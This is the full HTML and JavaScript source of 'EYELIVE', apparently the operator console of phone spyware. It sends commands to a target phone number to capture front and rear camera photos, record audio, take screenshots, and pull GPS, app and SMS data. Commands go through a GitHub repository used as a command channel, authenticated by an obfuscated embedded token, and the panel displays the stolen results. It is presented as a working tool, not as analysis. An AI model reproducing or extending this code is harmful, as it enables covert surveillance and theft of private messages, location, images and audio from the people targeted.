<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#fff;font-family:monospace;min-height:100vh}
        .header{background:#000;padding:20px;text-align:center;border-bottom:2px solid #ffd700}
        .header h1{color:#ffd700;font-size:1.5em;letter-spacing:3px}
        .container{max-width:450px;margin:0 auto;padding:20px}
        .card{background:#111;border:1px solid #222;border-radius:15px;padding:20px;margin:15px 0}
        input{width:100%;padding:15px;background:#000;border:1px solid #333;color:#fff;border-radius:10px;font-size:1.1em;text-align:center;margin:8px 0}
        .btn{width:100%;padding:15px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:1em;margin:5px 0;text-transform:uppercase}
        .btn-gold{background:#ffd700;color:#000}.btn-green{background:#00ff88;color:#000}.btn-red{background:#ff4400;color:#fff}
        .result{background:#000;border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;min-height:100px;font-size:.85em;color:#aaa;word-break:break-all}
        .result img{width:100%;border-radius:8px;margin:10px 0}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
    </style>
</head>
<body>
<div class="header"><h1>EYELIVE</h1></div>
<div class="container">
    <div class="card">
        <h2 style="color:#ffd700;margin-bottom:15px">📱 Painel de Monitoramento</h2>
        <input type="text" id="phone" placeholder="Numero do dispositivo: +55 11 99999-9999" autofocus>
        <button class="btn btn-gold" onclick="send('status')">📊 Ver Status</button>
        <div class="grid">
            <button class="btn btn-green" onclick="send('foto_frontal')">📸 Camera Frontal</button>
            <button class="btn btn-green" onclick="send('foto_traseira')">📸 Camera Traseira</button>
            <button class="btn btn-red" onclick="send('audio')">🎤 Gravar Audio 10s</button>
            <button class="btn btn-gold" onclick="send('screenshot')">📱 Screenshot Tela</button>
        </div>
    </div>
    <div class="result" id="result">👆 Digite o numero do dispositivo e clique em um botao</div>
</div>
<script>
// Token decodificado na hora (Cesar shift -7)
function decodificarToken() {
    var t = "now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da";
    var r = "";
    for(var i=0;i<t.length;i++) {
        var c = t[i];
        if(c.match(/[a-zA-Z]/)) {
            var b = c === c.toUpperCase() ? 65 : 97;
            r += String.fromCharCode((c.charCodeAt(0) - b - 7 + 26) % 26 + b);
        } else {
            r += c;
        }
    }
    return r;
}

var TOKEN = decodificarToken();
var REPO = "gynbetfc/eyelive";

function hash(s) {
    var h = 0;
    for(var i=0;i<s.length;i++) { h = ((h<<5)-h) + s.charCodeAt(i); h |= 0 }
    return Math.abs(h).toString(16).substring(0,12);
}

async function send(cmd) {
    var phone = document.getElementById('phone').value.replace(/[^0-9]/g,'');
    if(!phone) { alert('Digite o numero do dispositivo!'); return; }
    
    var id = hash(phone);
    var data = { cmd: cmd, target: phone, time: new Date().toISOString() };
    var content = btoa(JSON.stringify(data));
    
    document.getElementById('result').innerHTML = '⏳ Enviando comando...';
    
    try {
        var h = { 'Authorization': 'token ' + TOKEN, 'Accept': 'application/vnd.github.v3+json' };
        var url = 'https://api.github.com/repos/' + REPO + '/contents/comandos/' + id + '.json';
        
        var r = await fetch(url, {
            method: 'PUT',
            headers: h,
            body: JSON.stringify({ message: 'CMD', content: content, branch: 'main' })
        });
        
        if(r.ok) {
            document.getElementById('result').innerHTML = '⏳ Aguardando resposta do dispositivo... (10s)';
            await new Promise(function(resolve) { setTimeout(resolve, 10000) });
            
            var r2 = await fetch('https://api.github.com/repos/' + REPO + '/contents/respostas/' + id + '.json', { headers: h });
            if(r2.ok) {
                var respData = await r2.json();
                var resp = JSON.parse(atob(respData.content));
                mostrar(resp);
            } else {
                document.getElementById('result').innerHTML = '❌ Dispositivo nao respondeu. O bot esta rodando la?';
            }
        } else {
            var err = await r.json();
            document.getElementById('result').innerHTML = '❌ Erro: ' + (err.message || 'Falha ao enviar');
        }
    } catch(e) {
        document.getElementById('result').innerHTML = '❌ Erro de conexao. Verifique sua internet.';
    }
}

function mostrar(resp) {
    var h = '';
    if(resp.cmd == 'status' && resp.result) {
        try {
            var d = JSON.parse(resp.result);
            h += '<p style="font-size:1.1em">📱 <b style="color:#ffd700">' + d.phone + '</b></p>';
            h += '<p>🕐 <b>' + d.time + '</b></p>';
            h += '<p>🔋 Bateria: <b style="color:#00ff88">' + (d.bateria || '?') + '</b></p>';
            h += '<p>📍 GPS: ' + JSON.stringify(d.gps) + '</p>';
            h += '<p>📱 Apps recentes: ' + (d.apps || []).join(', ') + '</p>';
            if(d.sms && d.sms.length > 0) {
                h += '<p>💬 SMS (' + d.sms.length + '):</p>';
                d.sms.forEach(function(s) { h += '<p style="font-size:.75em;color:#888"> - ' + (s.body || s).substring(0,80) + '</p>'; });
            }
        } catch(e) { h += '<p>' + resp.result + '</p>'; }
    } else if(resp.result && resp.result.length > 100) {
        h += '<p>✅ <b style="color:#00ff88">' + resp.cmd + '</b> capturado!</p>';
        if(resp.cmd.includes('foto') || resp.cmd.includes('screen')) {
            h += '<img src="data:image/jpeg;base64,' + resp.result + '" onclick="window.open(this.src)">';
        } else if(resp.cmd == 'audio') {
            h += '<audio controls style="width:100%;margin-top:10px"><source src="data:audio/aac;base64,' + resp.result + '"></audio>';
        }
    } else {
        h += '<p>' + JSON.stringify(resp, null, 2) + '</p>';
    }
    document.getElementById('result').innerHTML = h;
}

// Carregar numero salvo
var saved = localStorage.getItem('eyelive_phone');
if(saved) document.getElementById('phone').value = saved;
document.getElementById('phone').addEventListener('change', function() {
    localStorage.setItem('eyelive_phone', this.value);
});
</script>
</body>
</html>
